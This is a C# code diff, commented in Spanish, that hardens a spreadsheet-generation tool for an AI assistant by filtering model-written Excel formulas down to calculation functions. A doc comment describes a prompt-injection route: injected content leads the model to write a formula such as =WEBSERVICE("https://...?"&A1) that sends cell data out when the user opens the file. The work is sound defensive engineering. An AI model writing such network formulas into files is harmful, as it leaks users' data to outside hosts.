@@ -17,11 +17,11 @@ public static class DocumentGenerator
     /// <summary>Markdown → PDF.</summary>
     public static byte[] ToPdf(string markdown, DocumentStyleOptions? options = null) => PdfWriter.FromMarkdown(markdown, options);
 
-    /// <summary>Tablas Markdown → Excel (una hoja por tabla).</summary>
+    /// <summary>Tablas Markdown → Excel (una hoja por tabla). Los textos que parecen fórmulas se escriben como texto.</summary>
     public static byte[] ToXlsx(string markdownTables, SheetOptions? options = null) =>
         new SpreadsheetBuilder().AddMarkdownTables(markdownTables, options).Build();
 
-    /// <summary>Objetos → Excel.</summary>
+    /// <summary>Objetos → Excel. Los textos que parecen fórmulas se escriben como texto.</summary>
     public static byte[] ToXlsx<T>(IEnumerable<T> items, string sheetName = "Datos", SheetOptions? options = null) =>
         new SpreadsheetBuilder().AddSheet(sheetName, items, options).Build();
 }
@@ -44,6 +44,20 @@ public sealed class DocumentToolOptions
     public bool Pdf { get; init; } = true;
 
     public bool Excel { get; init; } = true;
+
+    /// <summary>
+    /// Permite que <c>create_spreadsheet</c> escriba fórmulas (por defecto true, filtradas con <see cref="FormulaFilter"/>):
+    /// el modelo puede escribir <c>=B2*C2</c> o <c>=SUM(B2:B9)</c>. False escribe todo como texto.
+    /// </summary>
+    public bool AllowFormulas { get; init; } = true;
+
+    /// <summary>
+    /// Fórmulas del modelo que se escriben como tales (por defecto <see cref="SpreadsheetBuilder.IsSafeFormula"/>: solo
+    /// funciones de cálculo, sin red, enlaces, DDE ni otros libros); las demás quedan como texto. El contenido que el
+    /// modelo lee (páginas, correos, documentos) puede inyectarle instrucciones, y una fórmula como
+    /// <c>=WEBSERVICE("https://...?"&amp;A1)</c> filtraría datos cuando el usuario abra el archivo. Null admite cualquiera.
+    /// </summary>
+    public Func<string, bool>? FormulaFilter { get; init; } = SpreadsheetBuilder.IsSafeFormula;
 }
 
 /// <summary>
@@ -59,7 +73,8 @@ public static class DocumentTools
         Puedes generar archivos descargables: create_word_document y create_pdf a partir de Markdown
         (títulos #, listas, tablas, **negrita**, citas, bloques de código y \pagebreak para saltos de página),
         y create_spreadsheet con hojas, columnas tipadas (text, number, integer, currency, percent, date, boolean)
-        y filas de datos; los textos que empiezan con "=" son fórmulas de Excel (p. ej. "=B2*C2").
+        y filas de datos; los textos que empiezan con "=" son fórmulas de Excel (p. ej. "=B2*C2" o "=SUM(D2:D9)"),
+        solo con funciones de cálculo (no enlaces ni funciones de red, que se escriben como texto).
         Escribe contenido completo y bien estructurado. Después de generar, entrega el enlace y un resumen breve.
         """;
 
@@ -116,7 +131,14 @@ public static class DocumentTools
                 "Genera un archivo Excel (.xlsx) con una o más hojas, columnas tipadas, formatos, filtros y totales.",
                 (input, ctx, ct) =>
                 {
-                    var builder = new SpreadsheetBuilder { Title = input.Title, Author = options.Style.Author, AccentColor = options.Style.AccentColor };
+                    var builder = new SpreadsheetBuilder
+                    {
+                        Title = input.Title,
+                        Author = options.Style.Author,
+                        AccentColor = options.Style.AccentColor,
+                        AllowFormulas = options.AllowFormulas,
+                        FormulaFilter = options.FormulaFilter,
+                    };
                     foreach (var sheet in input.Sheets)
                     {
                         builder.AddSheet(
@@ -149,7 +171,7 @@ public static class DocumentTools
     private sealed record SheetInput(
         [property: Description("Nombre de la hoja (máx. 31 caracteres).")] string Name,
         [property: Description("Columnas en orden.")] IReadOnlyList<ColumnInput> Columns,
-        [property: Description("Filas: arrays con un valor por columna (números como número, fechas ISO yyyy-MM-dd, fórmulas con =).")] IReadOnlyList<IReadOnlyList<JsonElement>> Rows,
+        [property: Description("Filas: arrays con un valor por columna (números como número, fechas ISO yyyy-MM-dd, fórmulas de cálculo con =).")] IReadOnlyList<IReadOnlyList<JsonElement>> Rows,
         [property: Description("Agrega fila de totales con SUM en columnas numéricas.")] bool? Totals = null);
 
     private sealed record SpreadsheetInput(
